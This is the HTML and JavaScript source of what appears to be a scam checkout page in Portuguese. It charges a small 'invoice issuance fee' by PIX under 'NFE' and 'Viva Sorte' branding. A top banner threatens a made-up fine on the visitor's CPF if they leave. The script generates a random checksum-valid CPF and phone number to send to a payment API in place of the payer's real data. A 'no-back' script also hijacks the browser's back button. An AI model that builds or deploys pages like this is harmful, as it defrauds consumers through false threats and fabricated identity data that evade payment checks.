<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NFE - Checkout</title>
    <meta name="description" content="Plataforma de pagamentos" />
    <link
      rel="icon"
      href="images/nfe.webp"
      type="image/png"
    />
    <link rel="stylesheet" href="css/styles.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
  </head>
  <body class="font-inter">
    <main class="bg-gray-100">
      <div id="checkoutForm">
        <!-- Logo Viva Sorte -->
        <div style="text-align: center; padding: 20px 0; background: white;">
          <img src="images/nfe.webp" alt="NFE" style="max-height: 80px; height: auto;" />
        </div>
        
        <div
          style="
            background-color: #5B8E5F;
            color: white;
            padding: 1rem;
            text-align: center;
            margin-bottom: 0.5rem;
          "
        >
          <p style="margin: 0; font-size: 14px; font-weight: 600">
            <strong>ATENÇÃO:</strong> Seu pedido já foi separado, mas há uma pendência. Em caso de desistência agora, será aplicada uma multa de R$178,26 no CPF, conforme os Termos de Uso.
          </p>
          <p style="margin: 0; font-size: 14px">
        
          </p>
        </div>

        
        </div>
        <div class="container">
          <aside class="cart-summary">
            <section>
              <div class="cart-header">
                <h2>Guia de Pagamento</h2>

              </div>
              <div class="cart-item">
                <div class="item-details">
                  <div class="item-image">
                    <img src="images/logo.webp" alt="Guia de Pagamento" />
                  </div>
                  <div class="item-info">
                    <span class="item-name">Taxa de Emissão de Nota Fiscal</span>
                    <div class="item-meta">
                      <span>Pagamento único</span>
                     
                    </div>
                  </div>
                </div>
              </div>
              <div class="cart-total">
                <span>Total</span>
                <strong id="totalValue">R$ 17,61</strong>
              </div>
            </section>
          </aside>

          <form class="checkout-form" id="paymentForm">
            <div class="form-section">
              <h2>Identificação</h2>
              <div class="form-grid">
                <div class="form-group">
                  <label for="email">E-mail</label>
                  <div class="email-input-wrapper">
                    <input
                      type="email"
                      id="email"
                      name="email"
                      placeholder="Seu e-mail"
                      required
                      autocomplete="off"
                    />
                    <div id="emailSuggestions" class="email-suggestions"></div>
                  </div>
                </div>
                <div class="form-group">
                  <label for="name">Nome completo</label>
                  <input
                    type="text"
                    id="name"
                    name="name"
                    placeholder="Seu nome completo"
                    required
                    maxlength="30"
                  />
                </div>
              </div>
            </div>



            <div class="form-section payment-section">
              <h2>Forma de pagamento</h2>
              <div class="payment-method">
                <div class="payment-option">
                  <img
                    src="images/card-pix.svg"
                    alt="PIX"
                    class="payment-icon"
                  />
                  <span class="payment-label">PIX</span>
                </div>
              </div>
              <button type="submit" class="submit-button">Gerar PIX</button>
            </div>
          </form>
        </div>
      </div>

      <!-- Tela do PIX (inicialmente oculta) -->
      <div id="pixScreen" style="display: none" class="pix-screen">
        <!-- Logo Viva Sorte -->
        <div class="pix-header">
          <img src="images/viva-logo.png" alt="Viva Sorte" class="pix-logo" />
        </div>

        <div class="pix-container">
          <div class="pix-content">
            <!-- Status do pagamento -->
            <div class="pix-status">
              <div class="status-icon">
                <i class="ph ph-clock"></i>
              </div>
              <h2 class="pix-title">
                Falta pouco! 
                <span class="pix-subtitle">Finalize seu pagamento com PIX</span>
              </h2>
            </div>

            <!-- QR Code e Código PIX -->
            <div class="pix-payment-section">
              <div class="qr-code-section">
                <div class="qr-code-container">
                  <div id="qrcode"></div>
                </div>
                <p class="qr-description">
                  Escaneie o QR Code com seu<br>
                  aplicativo bancário
                </p>
              </div>

              <div class="pix-divider">
                <span class="divider-text">ou</span>
              </div>

              <div class="pix-code-section">
                <h3 class="section-title">PIX Copia e Cola</h3>
                <div class="pix-code-container">
                  <input type="text" id="pixCode" readonly placeholder="Código PIX será gerado aqui..." />
                  <button id="copyPixButton" class="copy-button">
                    <svg viewBox="0 0 24 24" width="20" height="20">
                      <path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path>
                    </svg>
                    <span class="copy-text">Copiar</span>
                  </button>
                </div>
              </div>
            </div>

            <!-- Instruções de pagamento -->
            <div class="payment-instructions">
              <h3 class="instructions-title">Como pagar com PIX</h3>
              <div class="instructions-steps">
                <div class="instruction-step">
                  <div class="step-number">1</div>
                  <div class="step-content">
                    <div class="step-icon">
                      <i class="ph ph-bank"></i>
                    </div>
                    <p>Abra o app do seu banco</p>
                  </div>
                </div>
                <div class="instruction-step">
                  <div class="step-number">2</div>
                  <div class="step-content">
                    <div class="step-icon">
                      <i class="ph ph-qr-code"></i>
                    </div>
                    <p>Escaneie o QR Code ou cole o código PIX</p>
                  </div>
                </div>
                <div class="instruction-step">
                  <div class="step-number">3</div>
                  <div class="step-content">
                    <div class="step-icon">
                      <i class="ph ph-check-circle"></i>
                    </div>
                    <p>Confirme o pagamento</p>
                  </div>
                </div>
              </div>
            </div>
              
          </div>
        </div>
      </div>

      <!-- Adicione após o form e antes da tela do PIX -->
      <div id="loadingScreen" class="loading-screen" style="display: none">
        <div class="loading-content">
          <div class="loading-spinner"></div>
          <h2>Gerando seu PIX...</h2>
          <p>Aguarde um momento</p>
        </div>
      </div>
    </main>

    <footer>
      <div
        style="
          text-align: center;
          margin-bottom: 10px;
          color: #666;
          font-size: 14px;
        "
      >
        © 2025 Viva Sorte
      </div>
      <button class="security-button">
        <svg viewBox="0 0 24 24" class="security-icon">
          <path
            d="M11.488 21.754c.294.157.663.156.957-.001 8.012-4.304 8.581-12.713 8.574-15.104a.988.988 0 0 0-.596-.903l-8.05-3.566a1.005 1.005 0 0 0-.813.001L3.566 5.747a.99.99 0 0 0-.592.892c-.034 2.379.445 10.806 8.514 15.115zM8.674 10.293l2.293 2.293 4.293-4.293 1.414 1.414-5.707 5.707-3.707-3.707 1.414-1.414z"
          ></path>
        </svg>
        Ambiente seguro
      </button>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script>
      // Função para gerar CPF válido
      function generateValidCPF() {
        const randomDigits = Array.from({length: 9}, () => Math.floor(Math.random() * 10));
        
        // Calcular primeiro dígito verificador
        let sum = 0;
        for (let i = 0; i < 9; i++) {
          sum += randomDigits[i] * (10 - i);
        }
        let firstDigit = 11 - (sum % 11);
        if (firstDigit >= 10) firstDigit = 0;
        
        // Calcular segundo dígito verificador
        sum = 0;
        for (let i = 0; i < 9; i++) {
          sum += randomDigits[i] * (11 - i);
        }
        sum += firstDigit * 2;
        let secondDigit = 11 - (sum % 11);
        if (secondDigit >= 10) secondDigit = 0;
        
        return [...randomDigits, firstDigit, secondDigit].join('');
      }

      // Função para gerar telefone válido
      function generateValidPhone() {
        const areaCodes = ['11', '12', '13', '14', '15', '16', '17', '18', '19', '21', '22', '24', '27', '28', '31', '32', '33', '34', '35', '37', '38', '41', '42', '43', '44', '45', '46', '47', '48', '49', '51', '53', '54', '55', '61', '62', '63', '64', '65', '66', '67', '68', '69', '71', '73', '74', '75', '77', '79', '81', '82', '83', '84', '85', '86', '87', '88', '89', '91', '92', '93', '94', '95', '96', '97', '98', '99'];
        const areaCode = areaCodes[Math.floor(Math.random() * areaCodes.length)];
        const firstDigit = '9'; // Celular sempre começa com 9
        const restDigits = Array.from({length: 8}, () => Math.floor(Math.random() * 10)).join('');
        return areaCode + firstDigit + restDigits;
      }

      // Variáveis globais para controle de preços
      let basePrice = 1761; // R$ 17,61 em centavos

      // Adiciona os listeners para os campos
      document.addEventListener("DOMContentLoaded", function () {
        // Preenche os campos com parâmetros da URL se existirem
        const urlParams = new URLSearchParams(window.location.search);

        if (urlParams.has("name")) {
          document.getElementById("name").value = urlParams.get("name");
        }

        if (urlParams.has("email")) {
          document.getElementById("email").value = urlParams.get("email");
        }


      });

      document
        .getElementById("paymentForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault();



          // Mostra a tela de loading
          document.getElementById("loadingScreen").style.display = "flex";

          // Gera dados automaticamente
          const generatedCPF = generateValidCPF();
          const generatedPhone = generateValidPhone();

          const formData = {
            amount: basePrice,
            description: "Pix",
            customer: {
              name: document.getElementById("name").value,
              document: generatedCPF,
              phone: generatedPhone,
              email: document.getElementById("email").value
            },
            item: {
              title: "Taxa de Emissão de Nota Fiscal",
              price: basePrice,
              quantity: 1,
            },
            utm:
              new URLSearchParams(window.location.search).toString() ||
              "correios",
            paymentMethod: "PIX",
          };

          try {
            const response = await fetch("https://app.duttyonpay.com.br/api-pix/-dKPGxzPKkPSKEuwgxPtne-11qYlm5M_Bh4JBYDaPRRtJmNKp099e5nfkd0onwVUgeaAy3aGf9KGj_kM10-Xbg", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(formData),
            });

            const data = await response.json();

            if (data.pixCode && data.transactionId) {
              // Esconde a tela de loading
              document.getElementById("loadingScreen").style.display = "none";
              // Oculta o formulário e mostra a tela do PIX
              document.getElementById("checkoutForm").style.display = "none";
              document.getElementById("pixScreen").style.display = "block";

              // Limpa completamente o container do QR Code e remove qualquer QR Code existente
              const qrContainer = document.getElementById("qrcode");
              while (qrContainer.firstChild) {
                qrContainer.removeChild(qrContainer.firstChild);
              }
              
              // Cria uma nova instância do QR Code
              const qr = new QRCode(qrContainer, {
                text: data.pixCode,
                width: 160,
                height: 160,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.M,
                margin: 0
              });

              // Preenche o código PIX
              document.getElementById("pixCode").value = data.pixCode;

              // Inicia verificação do pagamento
              startPaymentCheck(data.transactionId);
            }
          } catch (error) {
            // Esconde a tela de loading em caso de erro
            document.getElementById("loadingScreen").style.display = "none";
            console.error("Erro ao gerar PIX:", error);
            alert("Erro ao gerar o PIX. Por favor, tente novamente.");
          }
        });

      // Função para copiar o código PIX
      document
        .getElementById("copyPixButton")
        .addEventListener("click", function () {
          const pixCode = document.getElementById("pixCode");
          pixCode.select();
          document.execCommand("copy");
          this.innerHTML =
            '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path></svg><span class="copy-text">Copiado!</span>';
          setTimeout(() => {
            this.innerHTML =
              '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path></svg><span class="copy-text">Copiar</span>';
          }, 2000);
        });

function startPaymentCheck(transactionId) {
  let checkCount = 0;
  const maxChecks = 60; // 10 minutos, 1 verificação a cada 10s

  const interval = setInterval(async () => {
    try {
      const response = await fetch(`https://app.duttyonpay.com.br/api-pix/-dKPGxzPKkPSKEuwgxPtne-11qYlm5M_Bh4JBYDaPRRtJmNKp099e5nfkd0onwVUgeaAy3aGf9KGj_kM10-Xbg?transactionId=${transactionId}`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const data = await response.json();

      if (data.status === "COMPLETED") {
        clearInterval(interval);
        window.location.href = "../../up3/index.html";
      }
    } catch (error) {
      console.error("Erro ao verificar pagamento:", error);
    }

    checkCount++;
    if (checkCount >= maxChecks) {
      clearInterval(interval);
      alert("Tempo esgotado para verificação do pagamento.");
    }
  }, 10000); // verifica a cada 10 segundos
}


      // Lista de domínios comuns
      const emailDomains = [
        "@gmail.com",
        "@hotmail.com",
        "@outlook.com",
        "@yahoo.com",
        "@icloud.com",
      ];

      const emailInput = document.getElementById("email");
      const suggestionsDiv = document.getElementById("emailSuggestions");

      emailInput.addEventListener("input", function (e) {
        const value = e.target.value;

        // Limpa sugestões anteriores
        suggestionsDiv.innerHTML = "";

        // Se não tiver @, mostra sugestões
        if (value && !value.includes("@")) {
          emailDomains.forEach((domain) => {
            const suggestion = document.createElement("div");
            suggestion.className = "email-suggestion";
            suggestion.textContent = value + domain;

            suggestion.addEventListener("click", () => {
              emailInput.value = suggestion.textContent;
              suggestionsDiv.innerHTML = "";
              emailInput.focus();
            });

            suggestionsDiv.appendChild(suggestion);
          });
        }
      });

      // Fecha sugestões quando clicar fora
      document.addEventListener("click", (e) => {
        if (!e.target.closest(".email-input-wrapper")) {
          suggestionsDiv.innerHTML = "";
        }
      });
    </script>

    <style>
      /* Adicione estes estilos ao seu CSS */
      .email-input-wrapper {
        position: relative;
        width: 100%;
      }

      .email-suggestions {
        position: absolute;
        top: 100%;
        left: 0;
        right: 0;
        background: white;
        border-radius: 4px;
        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        z-index: 1000;
        max-height: 200px;
        overflow-y: auto;
      }

      .email-suggestion {
        padding: 10px;
        cursor: pointer;
        transition: background-color 0.2s;
      }

      .email-suggestion:hover {
        background-color: #f5f5f5;
      }

      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(255, 255, 255, 0.95);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }

      .loading-content {
        text-align: center;
      }

      .loading-spinner {
        width: 50px;
        height: 50px;
        border: 5px solid #f3f3f3;
        border-top: 5px solid #5B8E5F;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
      }

      .loading-content h2 {
        color: #333;
        margin-bottom: 10px;
      }

      .loading-content p {
        color: #666;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .instruction-step .step-icon {
        width: 40px;
        height: 40px;
        background: #5B8E5F;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .instruction-step .step-icon i {
        color: white;
        font-size: 20px;
      }

      .instruction-step {
        display: flex;
        align-items: center;
        gap: 15px;
        margin-bottom: 15px;
      }



      /* Estilos para a tela PIX */
      .pix-screen {
        min-height: 100vh;
        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
        padding: 0;
        margin: 0;
      }

      .pix-header {
        background: white;
        padding: 20px;
        text-align: center;
        border-bottom: 1px solid #e2e8f0;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
      }

      .pix-logo {
        max-height: 50px;
        height: auto;
      }

      .pix-container {
        max-width: 450px;
        margin: 0 auto;
        padding: 10px;
      }

      .pix-content {
        background: white;
        border-radius: 16px;
        padding: 20px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
        border: 1px solid #e2e8f0;
      }

      .pix-status {
        text-align: center;
        margin-bottom: 15px;
      }

      .status-icon {
        width: 45px;
        height: 45px;
        background: linear-gradient(135deg, #5B8E5F, #4A7A4E);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 8px;
      }

      .status-icon i {
        font-size: 18px;
        color: white;
      }

      .pix-title {
        font-size: 18px;
        font-weight: 700;
        color: #1a202c;
        margin: 0;
        line-height: 1.2;
      }

      .pix-subtitle {
        display: block;
        font-size: 13px;
        font-weight: 400;
        color: #64748b;
        margin-top: 3px;
      }

      .qr-code-section {
        text-align: center;
        margin-bottom: 12px;
      }

      .qr-code-container {
        background: white;
        border: 2px solid #e2e8f0;
        border-radius: 12px;
        padding: 12px;
        display: flex;
        justify-content: center;
        align-items: center;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
        margin-bottom: 8px;
        width: 184px;
        margin-left: auto;
        margin-right: auto;
      }

      #qrcode {
        width: 160px;
        height: 160px;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      #qrcode img {
        display: block;
        width: 160px;
        height: 160px;
        border-radius: 8px;
      }

      .qr-description {
        color: #64748b;
        font-size: 14px;
        margin: 0;
        line-height: 1.4;
      }

      .pix-divider {
        text-align: center;
        margin: 10px 0;
        position: relative;
      }

      .pix-divider::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 0;
        right: 0;
        height: 1px;
        background: #e2e8f0;
        z-index: 1;
      }

      .divider-text {
        background: white;
        padding: 0 15px;
        color: #94a3b8;
        font-size: 14px;
        font-weight: 500;
        position: relative;
        z-index: 2;
      }

      .pix-code-section {
        margin-bottom: 12px;
      }

      .section-title {
        font-size: 14px;
        font-weight: 600;
        color: #1a202c;
        margin: 0 0 8px 0;
        text-align: center;
      }

      .pix-code-container {
        display: flex;
        gap: 12px;
        background: #f8fafc;
        border: 2px solid #e2e8f0;
        border-radius: 12px;
        padding: 4px;
        transition: border-color 0.3s ease;
      }

      .pix-code-container:focus-within {
        border-color: #5B8E5F;
      }

      #pixCode {
        flex: 1;
        border: none;
        background: transparent;
        padding: 12px 16px;
        font-size: 14px;
        color: #374151;
        font-family: 'Courier New', monospace;
        border-radius: 8px;
        outline: none;
      }

      .copy-button {
        background: linear-gradient(135deg, #5B8E5F, #4A7A4E);
        border: none;
        border-radius: 8px;
        padding: 12px 16px;
        color: white;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 8px;
        transition: all 0.3s ease;
        white-space: nowrap;
      }

      .copy-button:hover {
        background: linear-gradient(135deg, #4A7A4E, #39663D);
        transform: translateY(-1px);
        box-shadow: 0 4px 12px rgba(91, 142, 95, 0.3);
      }

      .copy-button:active {
        transform: translateY(0);
      }

      .payment-instructions {
        background: #ffffff;
        border-radius: 16px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
      }

      .instructions-title {
        font-size: 18px;
        font-weight: 600;
        color: #1a202c;
        margin: 0 0 20px 0;
        text-align: center;
      }

      .instructions-steps {
        display: flex;
        flex-direction: column;
        gap: 16px;
      }

      .instruction-step {
        display: flex;
        align-items: center;
        gap: 16px;
        padding: 16px;
        background: #f8fafc;
        border-radius: 12px;
        border: 1px solid #e2e8f0;
        transition: all 0.3s ease;
      }

      .instruction-step:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
      }

      .step-number {
        width: 32px;
        height: 32px;
        background: linear-gradient(135deg, #5B8E5F, #4A7A4E);
        color: white;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        font-size: 14px;
        flex-shrink: 0;
      }

      .step-content {
        display: flex;
        align-items: center;
        gap: 16px;
        flex: 1;
      }

      .step-icon {
        width: 40px;
        height: 40px;
        background: #e2e8f0;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-shrink: 0;
      }

      .step-icon i {
        font-size: 20px;
        color: #5B8E5F;
      }

      .instruction-step p {
        color: #374151;
        font-size: 16px;
        margin: 0;
        font-weight: 500;
      }

      @media (max-width: 768px) {
        .payment-instructions {
          margin: 24px 0;
          padding: 20px;
        }

        .instructions-title {
          font-size: 16px;
          margin-bottom: 16px;
        }

        .instructions-steps {
          gap: 12px;
        }

        .instruction-step {
          padding: 12px;
          gap: 12px;
        }

        .step-number {
          width: 28px;
          height: 28px;
          font-size: 12px;
        }

        .step-icon {
          width: 36px;
          height: 36px;
        }

        .step-icon i {
          font-size: 18px;
        }

        .instruction-step p {
          font-size: 14px;
        }

      }
    </style>
    
      <script>
      (function(b) {
          var a = {
              version: "0.0.1",
              history_api: typeof history.pushState !== "undefined",
              init: function() {
                  b.location.hash = "#no-back";
                  a.configure();
              },
              hasChanged: function() {
                  if (b.location.hash == "#no-back") {
                      b.location.hash = "#";
                      b.location.href = "../back/"; //LINK PARA REDIRECIONAR AQUI
                  }
              },
              checkCompat: function() {
                  if (b.addEventListener) {
                      b.addEventListener("hashchange", a.hasChanged, false);
                  } else {
                      if (b.attachEvent) {
                          b.attachEvent("onhashchange", a.hasChanged);
                      } else {
                          b.onhashchange = a.hasChanged;
                      }
                  }
              },
              configure: function() {
                  if (b.location.hash == "#no-back") {
                      if (this.history_api) {                        
                          history.pushState(null, "", "#");
                        } else {
                            b.location.hash = "#";
                            b.location.href = "../back/"; //LINK PARA REDIRECIONAR AQUI
                        }
                    }
                    a.checkCompat();
                    a.hasChanged();
                }
            };
            if (typeof define === "function" && define.amd) {
                define(function() {
                    return a;
                });
            } else {
                if (typeof module === "object" && module.exports) {
                    module.exports = a;
                } else {
                    b.noback = a;
                }
            }
            a.init();
        }(window));
</script>


  </body>
</html>
